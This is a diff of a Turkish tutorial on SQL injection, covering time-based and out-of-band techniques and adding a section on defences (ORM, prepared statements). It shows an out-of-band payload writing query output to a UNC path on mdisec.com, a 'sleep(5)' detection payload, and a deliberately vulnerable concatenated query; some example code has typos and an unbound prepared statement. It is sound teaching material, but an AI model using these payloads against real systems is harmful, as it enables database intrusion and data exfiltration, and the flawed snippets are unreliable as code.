@@ -465,7 +465,7 @@ haber var
 </html>
 ```
 
-# ** 4- Time Based Sqli**
+# **4- Time Based Sqli**
 
 Görselde yer alan iki sorgu da aynı sonucu döndürmekte.
 
@@ -481,7 +481,7 @@ IF(şart, doğruysa_döndür, yanlışsa_döndür)
 
 ![image](https://github.com/user-attachments/assets/501afec2-1993-4f8f-99e7-feb73cbd4a16)
 
-# ** 5- Out of Band Sqli**
+# **5- Out of Band Sqli**
 
 Kod yapımı değiştirdim. Web uygulaması, bizden aldığı değeri RabbitMQ isimli bir servise gönderdi. Artık sleep() ifadesini koysak bile veritabanı uyumayacaktır. Çünkü SQL injection bizim konuştuğumuz uygulamada yok. Bu uygulama bizden alıp başka bir yapıya göndermektedir.
 
@@ -511,3 +511,52 @@ Burada artık kendi sql sorgumuzu da çalıştırabiliriz;
 SELECT 'mdisec' INTO OUTFILE '\\\'+(SELECT 'mdisec')+'.mdisec.com/a';
 ```
 
+Bu işin defansif kısmından da bahsedeyim. Kod yapısını tekrar ele alıyorum.
+
+```
+id = request.get('id')
+
+query = "SELET * FROM haberler WHERE id = "+id
+
+db.execute(query)
+
+print("selam")
+```
+
+Artık günümüz uygulamalarında ORM kullanılmakta. Artık sql sorgusu yazmak yerine kod üzerinden veri çekmekteyiz.
+
+```
+ORM
+
+class Haberler(Table):
+ id = db.aut()
+
+id = request.get('id')
+
+Haberler.filter(id).get()
+
+//prepare statement
+query = "SELECT * FROM haberler WHERE id = :id"
+
+db.execute(query)
+
+print("selam")
+```
+
+SQL Injection, TIME BASED Payload’lar ile TESPİT EDİLİR !!!!
+
+sebebi şöyle;
+
+‘-sleep(5)-’
+
+```
+SELECT * FROM users id = ''-sleep(5)-'';
+```
+
+SQL Injection’ın tipi ne olursa olsun böyle bir payload eklediğimizde veritabanı uyumaya geçecektir.
+
+Time-based SQL Injection ile zafiyet tespiti yaptıktan sonra artık hangi türde SQL Injection olduğunu araştırabiliriz.
+
+# **Kaynakça**
+
+https://www.youtube.com/watch?v=WtHnT73NaaQ&list=PLwP4ObPL5GY940XhCtAykxLxLEOKCu0nT
